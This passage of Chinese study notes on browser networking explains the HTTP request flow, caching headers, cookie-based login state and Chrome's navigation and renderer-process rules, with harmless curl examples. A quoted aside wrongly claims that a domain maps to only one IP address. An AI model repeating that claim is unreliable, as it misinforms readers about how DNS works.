保证了数据完整地传输，它的连接可分为三个阶段：建立连接、传输数据和断开连接。</li></ul><p>其实了解 TCP 协议，是为了全方位了解 HTTP，包括其实际功能和局限性，之后才会更加深刻地理解为什么要推出 HTTP&#x2F;2，以及为什么要推出 QUIC 协议，也就是未来的 HTTP&#x2F;3。这是一个由浅入深、循序渐进的过程，我希望你能稳扎稳打，学好这每一步、每一个协议，后面“水到自然渠成”。</p><h2 id="3-HTTP-请求流程：为什么很多站点第二次打开速度会很快？"><a href="#3-HTTP-请求流程：为什么很多站点第二次打开速度会很快？" class="headerlink" title="3. HTTP 请求流程：为什么很多站点第二次打开速度会很快？"></a>3. HTTP 请求流程：为什么很多站点第二次打开速度会很快？</h2><p>在上一章节中我介绍了 TCP 协议是如何保证数据完整传输的，相信你还记得，一个 TCP 连接过程包括了建立连接、传输数据和断开连接三个阶段。</p><p>而 HTTP 协议，正是建立在 TCP 连接基础之上的。<strong>HTTP 是一种允许浏览器向服务器获取资源的协议，是 Web 的基础</strong>，通常由浏览器发起请求，用来获取不同类型的文件，例如 HTML 文件、CSS 文件、JavaScript 文件、图片、视频等。此外，<strong>HTTP 也是浏览器使用最广的协议</strong>，所以要想学好浏览器，就要先深入了解 HTTP。</p><p>不知道你是否有过下面这些疑问：</p><ol><li>为什么通常在第一次访问一个站点时，打开速度很慢，当再次访问这个站点时，速度就很快了？</li><li>当登录过一个网站之后，下次再访问该站点，就已经处于登录状态了，这是怎么做到的呢？</li></ol><p>这一切的秘密都隐藏在 HTTP 的请求过程中。所以，在今天这篇文章中，我将通过分析一个 HTTP 请求过程中每一步的状态来带你了解完整的 HTTP 请求过程，希望你看完这篇文章后，能够对 HTTP 协议有个全新的认识。</p><h3 id="浏览器端发起-HTTP-请求流程"><a href="#浏览器端发起-HTTP-请求流程" class="headerlink" title="浏览器端发起 HTTP 请求流程"></a>浏览器端发起 HTTP 请求流程</h3><p>如果你在浏览器地址栏里键入极客时间网站的地址：<a href="http://time.geekbang.org/index.html%EF%BC%8C">http://time.geekbang.org/index.html，</a> 那么接下来，浏览器会完成哪些动作呢？下面我们就一步一步详细“追踪”下。</p><h4 id="1-构建请求"><a href="#1-构建请求" class="headerlink" title="1. 构建请求"></a>1. 构建请求</h4><p>首先，浏览器构建<strong>请求行</strong>信息（如下所示），构建好后，浏览器准备发起网络请求。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">GET</span> /index.<span class="property">html</span> <span class="title class_">HTTP1</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><h4 id="2-查找缓存"><a href="#2-查找缓存" class="headerlink" title="2. 查找缓存"></a>2. 查找缓存</h4><p>在真正发起网络请求之前，浏览器会先在浏览器缓存中查询是否有要请求的文件。其中，<strong>浏览器缓存是一种在本地保存资源副本，以供下次请求时直接使用的技术</strong>。</p><p>当浏览器发现请求的资源已经在浏览器缓存中存有副本，它会拦截请求，返回该资源的副本，并直接结束请求，而不会再去源服务器重新下载。这样做的好处有：</p><ul><li>缓解服务器端压力，提升性能（获取资源的耗时更短了）；</li><li>对于网站来说，缓存是实现快速资源加载的重要组成部分。</li></ul><p>当然，如果缓存查找失败，就会进入网络请求过程了。</p><h4 id="3-准备-IP-地址和端口"><a href="#3-准备-IP-地址和端口" class="headerlink" title="3. 准备 IP 地址和端口"></a>3. 准备 IP 地址和端口</h4><p>不过，先不急，在了解网络请求之前，我们需要先看看 HTTP 和 TCP 的关系。因为浏览器使用<strong>HTTP 协议作为应用层协议</strong>，用来封装请求的文本信息；并使用<strong>TCP&#x2F;IP 作传输层协议</strong>将它发到网络上，所以在 HTTP 工作开始之前，浏览器需要通过 TCP 与服务器建立连接。也就是说<strong>HTTP 的内容是通过 TCP 的传输数据阶段来实现的</strong>，你可以结合下图更好地理解这二者的关系。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013133340081.png" alt="image-20221013133340081"></p><p>那接下来你可以思考这么“一连串”问题：</p><ul><li>HTTP 网络请求的第一步是做什么呢？结合上图看，是和服务器建立 TCP 连接。</li><li>那建立连接的信息都有了吗？在上一篇文章中，我们讲到建立 TCP 连接的第一步就是需要准备 IP 地址和端口号。</li><li>那怎么获取 IP 地址和端口号呢？这得看看我们现在有什么，我们有一个 URL 地址，那么是否可以利用 URL 地址来获取 IP 和端口信息呢？</li></ul><p>我们介绍过数据包都是通过 IP 地址传输给接收方的。由于 IP 地址是数字标识，比如极客时间网站的 IP 是 39.106.233.176, 难以记忆，但使用极客时间的域名（time.geekbang.org）就好记多了，所以基于这个需求又出现了一个服务，负责把域名和 IP 地址做一一映射关系。这套域名映射为 IP 的系统就叫做“<strong>域名系统</strong>”，简称<strong>DNS</strong>（Domain Name System）。</p><p>所以，这样一路推导下来，你会发现在<strong>第一步浏览器会请求 DNS 返回域名对应的 IP</strong>。当然浏览器还提供了<strong>DNS 数据缓存服务</strong>，如果某个域名已经解析过了，那么浏览器会缓存解析的结果，以供下次查询时直接使用，这样也会减少一次网络请求。</p><p>拿到 IP 之后，接下来就需要获取端口号了。通常情况下，如果 URL 没有特别指明端口号，那么 HTTP 协议默认是 80 端口。</p><blockquote><p>ip 地址与域名是一对多的关系。一个 ip 地址可以对应多个域名，但是一个域名只有一个 ip 地址。ip 地址是数字组成的，不方便记忆，所以有了域名，通过域名地址就能找到 ip 地址。</p></blockquote><h4 id="4-等待-TCP-队列"><a href="#4-等待-TCP-队列" class="headerlink" title="4. 等待 TCP 队列"></a>4. 等待 TCP 队列</h4><p>现在已经把端口和 IP 地址都准备好了，那么下一步是不是可以建立 TCP 连接了呢？</p><p>答案依然是“不行”。Chrome 有个机制，同一个域名同时最多只能建立 6 个 TCP 连接，如果在同一个域名下同时有 10 个请求发生，那么其中 4 个请求会进入排队等待状态，直至进行中的请求完成。</p><p>当然，如果当前请求数量少于 6，会直接进入下一步，建立 TCP 连接。</p><h4 id="5-建立-TCP-连接"><a href="#5-建立-TCP-连接" class="headerlink" title="5. 建立 TCP 连接"></a>5. 建立 TCP 连接</h4><p>排队等待结束之后，终于可以快乐地和服务器握手了，在 HTTP 工作开始之前，浏览器通过 TCP 与服务器建立连接。</p><h4 id="6-发送-HTTP-请求"><a href="#6-发送-HTTP-请求" class="headerlink" title="6. 发送 HTTP 请求"></a>6. 发送 HTTP 请求</h4><p>一旦建立了 TCP 连接，浏览器就可以和服务器进行通信了。而 HTTP 中的数据正是在这个通信过程中传输的。</p><p>你可以结合下图来理解，浏览器是如何发送请求信息给服务器的。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013135020680.png" alt="image-20221013135020680"></p><p>首先浏览器会向服务器发送<strong>请求行</strong>，它包括了<strong>请求方法、请求 URI（Uniform Resource Identifier）和 HTTP 版本协议</strong>。</p><p>发送请求行，就是告诉服务器浏览器需要什么资源，最常用的请求方法是<strong>Get</strong>。比如，直接在浏览器地址栏键入极客时间的域名（time.geekbang.org），这就是告诉服务器要 Get 它的首页资源。</p><p>另外一个常用的请求方法是<strong>POST</strong>，它用于发送一些数据给服务器，比如登录一个网站，就需要通过 POST 方法把用户信息发送给服务器。如果使用 POST 方法，那么浏览器还要准备数据给服务器，这里准备的数据是通过<strong>请求体</strong>来发送。</p><p>在浏览器发送请求行命令之后，还要以<strong>请求头</strong>形式发送其他一些信息，把浏览器的一些基础信息告诉服务器。比如包含了浏览器所使用的操作系统、浏览器内核等信息，以及当前请求的域名信息、浏览器端的 Cookie 信息，等等。</p><h3 id="服务器端处理-HTTP-请求流程"><a href="#服务器端处理-HTTP-请求流程" class="headerlink" title="服务器端处理 HTTP 请求流程"></a>服务器端处理 HTTP 请求流程</h3><p>历经千辛万苦，HTTP 的请求信息终于被送达了服务器。接下来，服务器会根据浏览器的请求信息来准备相应的内容。</p><h4 id="1-返回请求"><a href="#1-返回请求" class="headerlink" title="1. 返回请求"></a>1. 返回请求</h4><p>一旦服务器处理结束，便可以返回数据给浏览器了。你可以通过工具软件 curl 来查看返回请求数据，具体使用方法是在命令行中输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -i  https://time.geekbang.org/</span><br></pre></td></tr></table></figure><p>注意这里加上了<code>-i</code>是为了返回响应行、响应头和响应体的数据，返回的结果如下图所示，你可以结合这些数据来理解服务器是如何响应浏览器的。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013135505579.png" alt="image-20221013135505579"></p><p>首先服务器会返回<strong>响应行</strong>，包括协议版本和状态码。</p><p>但并不是所有的请求都可以被服务器处理的，那么一些无法处理或者处理出错的信息，怎么办呢？服务器会通过请求行的<strong>状态码</strong>来告诉浏览器它的处理结果，比如：</p><ul><li>最常用的状态码是 200，表示处理成功；</li><li>如果没有找到页面，则会返回<strong>404</strong>。</li></ul><p>状态码类型很多，这里我就不过多介绍了，网上有很多资料，你可以自行查询和学习。</p><p>随后，正如浏览器会随同请求发送请求头一样，服务器也会随同响应向浏览器发送<strong>响应头</strong>。响应头包含了服务器自身的一些信息，比如服务器生成返回数据的时间、返回的数据类型（JSON、HTML、流媒体等类型），以及服务器要在客户端保存的 Cookie 等信息。</p><p>发送完响应头后，服务器就可以继续发送<strong>响应体</strong>的数据，通常，响应体就包含了 HTML 的实际内容。</p><p>以上这些就是服务器响应浏览器的具体过程。</p><h4 id="2-断开连接"><a href="#2-断开连接" class="headerlink" title="2. 断开连接"></a>2. 断开连接</h4><p>通常情况下，一旦服务器向客户端返回了请求数据，它就要关闭 TCP 连接。不过如果浏览器或者服务器在其头信息中加入了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Connection:Keep-Alive</span><br></pre></td></tr></table></figure><p>那么 TCP 连接在发送后将仍然保持打开状态，这样浏览器就可以继续通过同一个 TCP 连接发送请求。<strong>保持 TCP 连接可以省去下次请求时需要建立连接的时间，提升资源加载速度</strong>。比如，一个 Web 页面中内嵌的图片就都来自同一个 Web 站点，如果初始化了一个持久连接，你就可以复用该连接，以请求其他资源，而不需要重新再建立新的 TCP 连接。</p><blockquote><p>什么是 keep-alive?</p><p>keep-alive 是客户端和服务端的一个约定，如果开启 keep-alive，则服务端在返回 response 后不关闭 TCP 连接；同样的，在接收完响应报文后，客户端也不关闭连接，发送下一个 HTTP 请求时会重用该连接。</p></blockquote><h4 id="3-重定向"><a href="#3-重定向" class="headerlink" title="3. 重定向"></a>3. 重定向</h4><p>到这里似乎请求流程快结束了，不过还有一种情况你需要了解下，比如当你在浏览器中打开 geekbang.org 后，你会发现最终打开的页面地址是 <a href="https://www.geekbang.org./">https://www.geekbang.org。</a></p><p>这两个 URL 之所以不一样，是因为涉及到了一个<strong>重定向操作</strong>。跟前面一样，你依然可以使用 curl 来查看下请求 geekbang.org 会返回什么内容？</p><p>在控制台输入如下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -I geekbang.org</span><br></pre></td></tr></table></figure><p>注意这里输入的参数是<code>-I</code>，和<code>-i</code>不一样，<code>-I</code>表示只需要获取响应头和响应行数据，而不需要获取响应体的数据，最终返回的数据如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013140538034.png" alt="image-20221013140538034"></p><p>从图中你可以看到，响应行返回的状态码是 301，状态 301 就是告诉浏览器，我需要重定向到另外一个网址，而需要重定向的网址正是包含在响应头的 Location 字段中，接下来，浏览器获取 Location 字段中的地址，并使用该地址重新导航，这就是一个完整重定向的执行流程。这也就解释了为什么输入的是 geekbang.org，最终打开的却是 <a href="https://www.geekbang.org/">https://www.geekbang.org</a> 了。</p><p>不过也不要认为这种跳转是必然的。如果你打开 <a href="https://12306.cn,你会发现这个站点是打不开的.这是因为/">https://12306.cn，你会发现这个站点是打不开的。这是因为</a> 12306 的服务器并没有处理跳转，所以必须要手动输入完整的 <a href="https://www.12306.com/">https://www.12306.com</a> 才能打开页面。</p><h3 id="问题解答"><a href="#问题解答" class="headerlink" title="问题解答"></a>问题解答</h3><p>说了这么多，相信你现在已经了解了 HTTP 的请求流程，那现在我们再回过头来看看文章开头提出的问题。</p><h4 id="1-为什么很多站点第二次打开速度会很快？"><a href="#1-为什么很多站点第二次打开速度会很快？" class="headerlink" title="1. 为什么很多站点第二次打开速度会很快？"></a>1. 为什么很多站点第二次打开速度会很快？</h4><p>如果第二次页面打开很快，主要原因是第一次加载页面过程中，缓存了一些耗时的数据。</p><p>那么，哪些数据会被缓存呢？从上面介绍的核心请求路径可以发现，<strong>DNS 缓存</strong>和<strong>页面资源缓存</strong>这两块数据是会被浏览器缓存的。其中，DNS 缓存比较简单，它主要就是在浏览器本地把对应的 IP 和域名关联起来，这里就不做过多分析了。</p><p>我们重点看下浏览器资源缓存，下面是缓存处理的过程：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013140659228.png" alt="image-20221013140659228"></p><p>首先，我们看下服务器是通过什么方式让浏览器缓存数据的？</p><p>从上图的第一次请求可以看出，当服务器返回<strong>HTTP 响应头</strong>给浏览器时，浏览器是<strong>通过响应头中的 Cache-Control 字段来设置是否缓存该资源</strong>。通常，我们还需要为这个资源设置一个缓存过期时长，而这个时长是通过 Cache-Control 中的 Max-age 参数来设置的，比如上图设置的缓存过期时间是 2000 秒。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cache-Control:Max-age=2000</span><br></pre></td></tr></table></figure><p>这也就意味着，在该缓存资源还未过期的情况下, 如果再次请求该资源，会直接返回缓存中的资源给浏览器。</p><p>但如果缓存过期了，浏览器则会继续发起网络请求，并且在<strong>HTTP 请求头</strong>中带上：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">If-None-Match:&quot;4f80f-13c-3a1xb12a&quot;</span><br></pre></td></tr></table></figure><p>服务器收到请求头后，会根据 If-None-Match 的值来判断请求的资源是否有更新。</p><ul><li>如果没有更新，就返回 304 状态码，相当于服务器告诉浏览器：“这个缓存可以继续使用，这次就不重复发送数据给你了。”</li><li>如果资源有更新，服务器就直接返回最新资源给浏览器。</li></ul><p>关于缓存的细节内容特别多，具体细节你可以参考这篇 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Caching_FAQ">HTTP 缓存</a>，在这里我就不赘述了。</p><p>简要来说，很多网站第二次访问能够秒开，是因为这些网站把很多资源都缓存在了本地，浏览器缓存直接使用本地副本来回应请求，而不会产生真实的网络请求，从而节省了时间。同时，DNS 数据也被浏览器缓存了，这又省去了 DNS 查询环节。</p><h4 id="2-登录状态是如何保持的？"><a href="#2-登录状态是如何保持的？" class="headerlink" title="2. 登录状态是如何保持的？"></a>2. 登录状态是如何保持的？</h4><p>通过上面的介绍，你已经了解了缓存是如何工作的。下面我们再一起看下登录状态是如何保持的。</p><ul><li>用户打开登录页面，在登录框里填入用户名和密码，点击确定按钮。点击按钮会触发页面脚本生成用户登录信息，然后调用 POST 方法提交用户登录信息给服务器。</li><li>服务器接收到浏览器提交的信息之后，查询后台，验证用户登录信息是否正确，如果正确的话，会生成一段表示用户身份的字符串，并把该字符串写到响应头的 Set-Cookie 字段里，如下所示，然后把响应头发送给浏览器。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-Cookie: UID=3431uad;</span><br></pre></td></tr></table></figure><ul><li>浏览器在接收到服务器的响应头后，开始解析响应头，如果遇到响应头里含有 Set-Cookie 字段的情况，浏览器就会把这个字段信息保存到本地。比如把<code>UID=3431uad</code>保持到本地。</li><li>当用户再次访问时，浏览器会发起 HTTP 请求，但在发起请求之前，浏览器会读取之前保存的 Cookie 数据，并把数据写进请求头里的 Cookie 字段里（如下所示），然后浏览器再将请求头发送给服务器。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Cookie: UID=3431uad;</span><br></pre></td></tr></table></figure><ul><li>服务器在收到 HTTP 请求头数据之后，就会查找请求头里面的“Cookie”字段信息，当查找到包含<code>UID=3431uad</code>的信息时，服务器查询后台，并判断该用户是已登录状态，然后生成含有该用户信息的页面数据，并把生成的数据发送给浏览器。</li><li>浏览器在接收到该含有当前用户的页面数据后，就可以正确展示用户登录的状态信息了。</li></ul><p>好了，通过这个流程你可以知道浏览器页面状态是通过使用 Cookie 来实现的。Cookie 流程可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013141343856.png" alt="image-20221013141343856"></p><p>简单地说，如果服务器端发送的响应头内有 Set-Cookie 的字段，那么浏览器就会将该字段的内容保持到本地。当下次客户端再往该服务器发送请求时，客户端会自动在请求头中加入 Cookie 值后再发送出去。服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到该用户的状态信息。</p><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>本篇文章的内容比较多、比较碎，但是非常重要，所以我先来总结下今天的主要内容。</p><p>为了便于你理解，我画了下面这张详细的“HTTP 请求示意图”，用来展现浏览器中的 HTTP 请求所经历的各个阶段。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013141448256.png" alt="image-20221013141448256"></p><p>从图中可以看到，浏览器中的 HTTP 请求从发起到结束一共经历了如下九个阶段：</p><ol><li>构建请求</li><li>查找缓存</li><li>准备 IP 和端口</li><li>等待 TCP 队列</li><li>建立 TCP 连接</li><li>发起 HTTP 请求</li><li>服务器处理请求</li><li>服务器返回请</li><li>断开连接</li><li><strong>特殊情况 重定向</strong></li></ol><p>然后我还通过 HTTP 请求路径解答了两个经常会碰到的问题，一个涉及到了 Cache 流程，另外一个涉及到如何使用 Cookie 来进行状态管理。</p><h2 id="4-导航流程：从输入-URL-到页面展示，这中间发生了什么？"><a href="#4-导航流程：从输入-URL-到页面展示，这中间发生了什么？" class="headerlink" title="4. 导航流程：从输入 URL 到页面展示，这中间发生了什么？"></a>4. 导航流程：从输入 URL 到页面展示，这中间发生了什么？</h2><p>“在浏览器里，从输入 URL 到页面展示，这中间发生了什么？ ”这是一道经典的面试题，能比较全面地考察应聘者知识的掌握程度，其中涉及到了网络、操作系统、Web 等一系列的知识。所以我在面试应聘者时也必问这道题，但遗憾的是大多数人只能回答其中部分零散的知识点，并不能将这些知识点串联成线，无法系统而又全面地回答这个问题。</p><p>那么今天我们就一起来探索下这个流程，下图是我梳理出的“从输入 URL 到页面展示完整流程示意图”：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013142429889.png" alt="image-20221013142429889"></p><p>从图中可以看出，<strong>整个过程需要各个进程之间的配合</strong>，所以在开始正式流程之前，我们还是先来快速回顾下浏览器进程、渲染进程和网络进程的主要职责。</p><ul><li>浏览器进程主要负责用户交互、子进程管理和文件储存等功能。</li><li>网络进程是面向渲染进程和浏览器进程等提供网络下载功能。</li><li>渲染进程的主要职责是把从网络下载的 HTML、JavaScript、CSS、图片等资源解析为可以显示和交互的页面。因为渲染进程所有的内容都是通过网络获取的，会存在一些恶意代码利用浏览器漏洞对系统进行攻击，所以运行在渲染进程里面的代码是不被信任的。这也是为什么 Chrome 会让渲染进程运行在安全沙箱里，就是为了保证系统的安全。</li></ul><p>回顾了浏览器的进程架构后，我们再结合上图来看下这个完整的流程，可以看出，整个流程包含了许多步骤，我把其中几个核心的节点用蓝色背景标记出来了。这个过程可以大致描述为如下：</p><p>1、首先，<strong>浏览器进程</strong>接收到用户输入的 URL 请求，<strong>浏览器进程</strong>便将该 URL 转发给<strong>网络进程</strong>。</p><p>2、然后，在<strong>网络进程</strong>中发起真正的 URL 请求。</p><p>3、接着<strong>网络进程</strong>接收到了响应头数据，便解析响应头数据，并将数据转发给<strong>浏览器进程</strong>。</p><p>4、<strong>浏览器进程</strong>接收到网络进程的响应头数据之后，发送“提交导航 (CommitNavigation)”消息到<strong>渲染进程</strong>；</p><p>5、<strong>渲染进程</strong>接收到“提交导航”的消息之后，便开始准备接收 HTML 数据，接收数据的方式是直接和<strong>网络进程</strong>建立数据管道；</p><p>6、最后<strong>渲染进程</strong>会向<strong>浏览器进程</strong>“确认提交”，这是告诉浏览器进程：“已经准备好接受和解析页面数据了”。</p><p>7、<strong>浏览器进程</strong>接收到<strong>渲染进程</strong>“提交文档”的消息之后，便开始移除之前旧的文档，然后更新<strong>浏览器进程</strong>中的页面状态。</p><p>这其中，<strong>用户发出 URL 请求到页面开始解析的这个过程，就叫做导航</strong>。下面我们来详细分析下这些步骤，同时也就解答了开头所说的那道经典的面试题。</p><h3 id="从输入-URL-到页面展示"><a href="#从输入-URL-到页面展示" class="headerlink" title="从输入 URL 到页面展示"></a>从输入 URL 到页面展示</h3><p>知道了浏览器的几个主要进程的职责之后，那么接下来，我们就从浏览器的地址栏开始讲起。</p><h4 id="1-用户输入"><a href="#1-用户输入" class="headerlink" title="1. 用户输入"></a>1. 用户输入</h4><p>当用户在地址栏中输入一个查询关键字时，地址栏会判断输入的关键字是<strong>搜索内容</strong>，还是<strong>请求的 URL</strong>。</p><ul><li>如果是搜索内容，地址栏会使用浏览器默认的搜索引擎，来合成新的带搜索关键字的 URL。</li><li>如果判断输入内容符合 URL 规则，比如输入的是 time.geekbang.org，那么地址栏会根据规则，把这段内容加上协议，合成为完整的 URL，如 <a href="https://time.geekbang.org./">https://time.geekbang.org。</a></li></ul><p>当用户输入关键字并键入回车之后，浏览器便进入下图的状态：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013144431265.png" alt="image-20221013144431265"></p><p>从图中可以看出，当浏览器刚开始加载一个地址之后，标签页上的图标便进入了加载状态。但此时图中页面显示的依然是之前打开的页面内容，并没立即替换为极客时间的页面。因为需要等待提交文档阶段，页面内容才会被替换。</p><h4 id="2-URL-请求过程"><a href="#2-URL-请求过程" class="headerlink" title="2. URL 请求过程"></a>2. URL 请求过程</h4><p>接下来，便进入了页面资源请求过程。这时，浏览器进程会通过进程间通信（IPC）把 URL 请求发送至网络进程，网络进程接收到 URL 请求后，会在这里发起真正的 URL 请求流程。那具体流程是怎样的呢？</p><p>首先，网络进程会查找本地缓存是否缓存了该资源。如果有缓存资源，那么直接返回资源给浏览器进程；如果在缓存中没有查找到资源，那么直接进入网络请求流程。这请求前的第一步是要进行 DNS 解析，以获取请求域名的服务器 IP 地址。如果请求协议是 HTTPS，那么还需要建立 TLS 连接。</p><p>接下来就是利用 IP 地址和服务器建立 TCP 连接。连接建立之后，浏览器端会构建请求行、请求头等信息，并把和该域名相关的 Cookie 等数据附加到请求头中，然后向服务器发送构建的请求信息。</p><p>服务器接收到请求信息后，会根据请求信息生成响应数据（包括响应行、响应头和响应体等信息），并发给网络进程。等网络进程接收了响应行和响应头之后，就开始解析响应头的内容了。（为了方便讲述，下面我将服务器返回的响应头和响应行统称为响应头。）</p><p><strong>（1）重定向</strong></p><p>在接收到服务器返回的响应头后，网络进程开始解析响应头，如果发现返回的状态码是 301 或者 302，那么说明服务器需要浏览器重定向到其他 URL。这时网络进程会从响应头的 Location 字段里面读取重定向的地址，然后再发起新的 HTTP 或者 HTTPS 请求，一切又重头开始了。</p><p>比如，我们在终端里输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -I http://time.geekbang.org/</span><br></pre></td></tr></table></figure><p><code>curl -I + URL</code>的命令是接收服务器返回的响应头的信息。执行命令后，我们看到服务器返回的响应头信息如下：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013145141854.png" alt="image-20221013145141854"></p><p>从图中可以看出，极客时间服务器会通过重定向的方式把所有 HTTP 请求转换为 HTTPS 请求。也就是说你使用 HTTP 向极客时间服务器请求时，服务器会返回一个包含有 301 或者 302 状态码响应头，并把响应头的 Location 字段中填上 HTTPS 的地址，这就是告诉了浏览器要重新导航到新的地址上。</p><p>下面我们再使用 HTTPS 协议对极客时间发起请求，看看服务器的响应头信息是什么样子的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -I https://time.geekbang.org/</span><br></pre></td></tr></table></figure><p>我们看到服务器返回如下信息：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013145335103.png" alt="image-20221013145335103"></p><p>从图中可以看出，服务器返回的响应头的状态码是 200，这是告诉浏览器一切正常，可以继续往下处理该请求了。</p><p>好了，以上是重定向内容的介绍。现在你应该理解了，<strong>在导航过程中，如果服务器响应行的状态码包含了 301、302 一类的跳转信息，浏览器会跳转到新的地址继续导航；如果响应行是 200，那么表示浏览器可以继续处理该请求</strong>。</p><p><strong>（2）响应数据类型处理</strong></p><p>在处理了跳转信息之后，我们继续导航流程的分析。URL 请求的数据类型，有时候是一个下载类型，有时候是正常的 HTML 页面，那么浏览器是如何区分它们呢？</p><p>答案是 Content-Type。<strong>Content-Type 是 HTTP 头中一个非常重要的字段， 它告诉浏览器服务器返回的响应体数据是什么类型</strong>，然后浏览器会根据 Content-Type 的值来决定如何显示响应体的内容。</p><p>这里我们还是以极客时间为例，看看极客时间官网返回的 Content-Type 值是什么。在终端输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -I https://time.geekbang.org/</span><br></pre></td></tr></table></figure><p>返回信息如下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013145455384.png" alt="image-20221013145455384"></p><p>从图中可以看到，响应头中的 Content-type 字段的值是 text&#x2F;html，这就是告诉浏览器，服务器返回的数据是<strong>HTML 格式</strong>。</p><p>接下来我们再来利用 curl 来请求极客时间安装包的地址，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -I https://res001.geekbang.org/apps/geektime/android/2.3.1/official/geektime_2.3.1_20190527-2136_offical.apk</span><br></pre></td></tr></table></figure><p>请求后返回的响应头信息如下：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013153505340.png" alt="image-20221013153505340"></p><p>从返回的响应头信息来看，其 Content-Type 的值是 application&#x2F;octet-stream，显示数据是<strong>字节流类型</strong>的，通常情况下，浏览器会按照<strong>下载类型</strong>来处理该请求。</p><p>需要注意的是，如果服务器配置 Content-Type 不正确，比如将 text&#x2F;html 类型配置成 application&#x2F;octet-stream 类型，那么浏览器可能会曲解文件内容，比如会将一个本来是用来展示的页面，变成了一个下载文件。</p><p>所以，不同 Content-Type 的后续处理流程也截然不同。如果 Content-Type 字段的值被浏览器判断为<strong>下载类型，那么该请求会被提交给浏览器的下载管理器，同时该 URL 请求的导航流程就此结束</strong>。但如果是<strong>HTML，那么浏览器则会继续进行导航流程</strong>。由于 Chrome 的页面渲染是运行在渲染进程中的，所以接下来就需要准备渲染进程了。</p><h4 id="3-准备渲染进程"><a href="#3-准备渲染进程" class="headerlink" title="3. 准备渲染进程"></a>3. 准备渲染进程</h4><p>默认情况下，Chrome 会为每个页面分配一个渲染进程，也就是说，每打开一个新页面就会配套创建一个新的渲染进程。但是，也有一些例外，在某些情况下，浏览器会让多个页面直接运行在同一个渲染进程中。</p><p>比如我从极客时间的首页里面打开了另外一个页面——算法训练营，我们看下图的 Chrome 的任务管理器截图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013153856443.png" alt="image-20221013153856443"></p><p>从图中可以看出，打开的这三个页面都是运行在同一个渲染进程中，进程 ID 是 23601。</p><p><strong>那什么情况下多个页面会同时运行在一个渲染进程中呢？</strong></p><p>要解决这个问题，我们就需要先了解下什么是同一站点（same-site）。具体地讲，我们将“<strong>同一站点</strong>”定义为<strong>根域名</strong>（例如，geekbang.org）加上<strong>协议</strong>（例如，https:&#x2F;&#x2F; 或者 http:&#x2F;&#x2F;），还包含了该根域名下的所有子域名和不同的端口，比如下面这三个：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://time.geekbang.org</span><br><span class="line"></span><br><span class="line">https://www.geekbang.org</span><br><span class="line"></span><br><span class="line">https://www.geekbang.org:8080</span><br></pre></td></tr></table></figure><p>它们都是属于<strong>同一站点</strong>，因为它们的协议都是 HTTPS，而且根域名也都是 geekbang.org。</p><p>Chrome 的默认策略是，每个标签对应一个渲染进程。但<strong>如果从一个页面打开了另一个新页面，而新页面和当前页面属于同一站点的话，那么新页面会复用父页面的渲染进程</strong>。官方把这个默认策略叫 process-per-site-instance。</p><p>那若新页面和当前页面不属于同一站点，情况又会发生什么样的变化呢？比如我通过极客邦页面里的链接打开 InfoQ 的官网（<a href="https://www.infoq.cn/">https://www.infoq.cn/</a> ）， 因为 infoq.cn 和 geekbang.org 不属于同一站点，所以 infoq.cn 会使用一个新的渲染进程，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013153957260.png" alt="image-20221013153957260"></p><p>从图中任务管理器可以看出：由于极客邦和极客时间的标签页拥有<strong>相同的协议和根域名</strong>，所以它们属于<strong>同一站点</strong>，并运行在同一个渲染进程中；而 infoq.cn 的根域名不同于 geekbang.org，也就是说 InfoQ 和极客邦不属于同一站点，因此它们会运行在两个不同的渲染进程之中。</p><p>总结来说，打开一个新页面采用的<strong>渲染进程策略</strong>就是：</p><ul><li>通常情况下，打开新的页面都会使用单独的渲染进程；</li><li>如果从 A 页面打开 B 页面，且 A 和 B 都属于<strong>同一站点</strong>的话，那么 B 页面复用 A 页面的渲染进程；如果是其他情况，浏览器进程则会为 B 创建一个新的渲染进程。</li></ul><p>渲染进程准备好之后，还不能立即进入文档解析状态，因为此时的文档数据还在网络进程中，并没有提交给渲染进程，所以下一步就进入了提交文档阶段</p><h4 id="4-提交文档"><a href="#4-提交文档" class="headerlink" title="4. 提交文档"></a>4. 提交文档</h4><p>首先要明确一点，这里的“文档”是指 URL 